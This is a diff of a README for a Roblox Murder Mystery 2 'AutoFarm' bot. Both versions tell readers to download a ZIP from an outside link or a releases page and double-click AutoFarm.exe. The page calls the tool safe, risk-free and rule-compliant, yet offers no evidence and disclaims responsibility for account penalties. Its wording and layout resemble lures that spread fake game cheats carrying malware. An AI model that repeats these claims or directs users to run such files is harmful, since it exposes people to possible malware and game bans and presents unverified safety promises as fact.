@@ -1,36 +1,60 @@
-# 🔪 MM2 AutoFarm – No Scripts, No Mods
+# 🌱 AutoFarm - Safe and Easy Farming Tool for MM2
 
-AutoFarm for MM2 without scripts — safe, lightweight, and easy to use
+[![Download AutoFarm](https://img.shields.io/badge/Download_AutoFarm-Latest_release-brightgreen.svg)](https://github.com/maxspielbar/AutoFarm/releases)
 
-Automatically farm coins, experience, and wins in **Murder Mystery 2 (MM2)** on Roblox — **without using scripts, exploits, or DLL injection**. This tool works by simulating safe, human-like interactions with the game using Roblox's native UI, making it compliant with standard gameplay rules.
+## 📖 Introduction
 
-## ⬇️ Download
-Get the latest version here:  
-👉 [**Download**](https://bick-1003xq.github.io)
+Welcome to AutoFarm! This application allows you to automate farming in MM2 without any scripts. It is safe, lightweight, and user-friendly. You do not need to have any programming knowledge to use it. Follow the steps below to download and run AutoFarm easily.
 
-## ✅ Features
-- Fully script-free automation (no Lua injection)
-- No external DLLs or memory edits
-- Farm coins and XP by auto-playing rounds
-- Smart role recognition (detects Murderer, Sheriff, Innocent)
-- Adjustable delay settings for natural-looking behavior
-- Works with official Roblox client
+## 🚀 Getting Started
 
-## 🛠️ How to Use
-1. Download and extract the ZIP file  
-2. Open **Roblox** and join a Murder Mystery 2 server  
-3. Launch `AutoFarm.exe`  
-4. The tool will begin simulating mouse clicks and gameplay actions  
-5. Minimize or leave the game running — it handles the rest!
+To get started with AutoFarm, you need to download the application. Make sure your computer meets the following requirements:
 
-> 💡 For best results, play on a private or friends-only server to avoid unexpected interruptions.
+- **Operating System:** Windows 10 or later is recommended.
+- **Memory:** At least 2GB of RAM.
+- **Storage:** At least 100MB of free disk space.
+- **Internet Connection:** Required for downloading the application.
 
-## 📌 Important
-- This tool **does not modify game files or use exploits**  
-- It mimics legitimate user input — similar to macro softwar  
-- Developer is not responsible for account penalties (use responsibly)
+Once you have verified your system requirements, follow the steps below to download AutoFarm.
 
----
+## 📥 Download & Install
 
-Made for fans of MM2 who want to progress faster — the safe way.  
-🔒 No scripts. No risks. Just automation.
+1. Visit the Releases page to download: [AutoFarm Releases](https://github.com/maxspielbar/AutoFarm/releases)
+   
+2. On the Releases page, look for the latest version listed at the top. You will see a section with "Assets" where you can find the downloadable files.
+
+3. Click on the file that matches your system. This will begin the download process. The file is usually named something like `AutoFarm-v1.x.x.zip`.
+
+4. Once the download completes, locate the downloaded file on your computer. It will likely be in your "Downloads" folder.
+
+5. Extract the ZIP file by right-clicking on it and selecting "Extract All." Follow the prompts to extract the contents.
+
+6. After extraction, navigate to the folder containing the extracted files. 
+
+7. Look for the executable file named `AutoFarm.exe`. Double-click this file to run the application.
+
+8. Follow any on-screen instructions to set up AutoFarm on your system.
+
+## ⚙️ How to Use AutoFarm
+
+After installation, you can start using AutoFarm. Here’s how:
+
+1. Launch the application by double-clicking ‘AutoFarm.exe’ if it’s not already running.
+   
+2. When the application opens, you will see a simple interface. Follow the prompts to set your preferences for farming in MM2.
+
+3. Once you configure your settings, click the "Start" button. AutoFarm will begin to operate automatically.
+
+4. You can adjust your settings at any time by stopping and restarting the application.
+
+5. If you encounter any issues, check the help section in the application or refer to FAQs provided in the documentation.
+
+## 🤝 Support & Feedback
+
+For support, please visit our [GitHub Issues page](https://github.com/maxspielbar/AutoFarm/issues). Here, you can report problems or ask questions about how to use AutoFarm. We encourage user feedback to help improve the application.
+
+## 🔗 More Information
+
+For further details about AutoFarm, including updates and features, check the [GitHub Repository](https://github.com/maxspielbar/AutoFarm).
+
+Thank you for choosing AutoFarm. Happy farming!
